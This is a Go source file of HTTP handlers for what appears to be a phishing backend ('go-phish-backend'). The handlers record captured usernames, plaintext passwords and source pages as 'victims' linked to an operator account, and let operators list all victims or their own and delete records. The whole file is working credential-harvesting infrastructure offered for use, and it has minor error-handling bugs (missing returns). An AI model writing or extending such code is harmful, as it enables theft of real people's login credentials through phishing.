package handler

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"

	"github.com/google/uuid"

	"github.com/naijasonezeiru/go-phish-backend/internal/api/helper"
	"github.com/naijasonezeiru/go-phish-backend/internal/database"
)

func HandleNewVictim(w http.ResponseWriter, r *http.Request) {
	type parameters struct {
		Username string `json:"username"`
		Password string `json:"password"`
		Page     string `json:"page"`
		UserId   int    `json:"userId"`
	}
	decoder := json.NewDecoder(r.Body)

	params := parameters{}
	err := decoder.Decode(&params)
	if err != nil {
		helper.RespondWithError(w, 400, fmt.Sprintf("Error parsing JSON: %s", err))
		return
	}
	// userID, err := strconv.Atoi(params.UserId)
	// if err != nil {
	// 	helper.RespondWithError(w, http.StatusNotAcceptable, fmt.Sprintf("User id is not an integer: %s", err))
	// }
	victim, err := helper.ConnectDB().DB.CreateVictim(r.Context(), database.CreateVictimParams{
		Username: params.Username,
		Password: params.Password,
		Page:     params.Page,
		UserID:   int32(params.UserId),
	})
	if err != nil {
		helper.RespondWithError(w, 400, fmt.Sprintf("Error creating user: %s", err))
		return
	}
	helper.RespondWithJSON(w, 201, victim)
}

func HandleGetMyVictims(w http.ResponseWriter, r *http.Request) {
	type parameters struct {
		UserId string `json:"userId"`
	}
	decoder := json.NewDecoder(r.Body)

	params := parameters{}
	err := decoder.Decode(&params)
	if err != nil {
		helper.RespondWithError(w, 400, fmt.Sprintf("Error parsing JSON: %s", err))
		return
	}

	userID, err := strconv.Atoi(params.UserId)
	if err != nil {
		helper.RespondWithError(w, http.StatusNotAcceptable, fmt.Sprintf("User id is not an integer: %s", err))
	}

	victims, err := helper.ConnectDB().DB.GetVictimsByUserId(r.Context(), int32(userID))
	if err != nil {
		helper.RespondWithError(w, 400, fmt.Sprintf("Error getting user: %s", err))
		return
	}

	helper.RespondWithJSON(w, 201, victims)
}

func HandleGetAllVictims(w http.ResponseWriter, r *http.Request) {
	victims, err := helper.ConnectDB().DB.GetAllVictims(r.Context())
	if err != nil {
		helper.RespondWithError(w, 400, fmt.Sprintf("Error getting victims: %s", err))
		return
	}

	helper.RespondWithJSON(w, 200, victims)
}

func HandleVictimDelete(w http.ResponseWriter, r *http.Request) {
	type parameters struct {
		Id string `json:"id"`
	}
	decoder := json.NewDecoder(r.Body)

	params := parameters{}
	err := decoder.Decode(&params)
	if err != nil {
		helper.RespondWithError(w, 400, fmt.Sprintf("Error parsing JSON: %s", err))
		return
	}
	victimId, err := uuid.Parse(params.Id)
	if err != nil {
		helper.RespondWithError(w, 400, fmt.Sprintf("Error parsing id to uuid %s", err))
	}

	victim, err := helper.ConnectDB().DB.DeleteVictim(r.Context(), victimId)
	if err != nil {
		helper.RespondWithError(w, 400, fmt.Sprintf("Error deleting victim: %s", err))
		return
	}

	helper.RespondWithJSON(w, 200, victim)
}
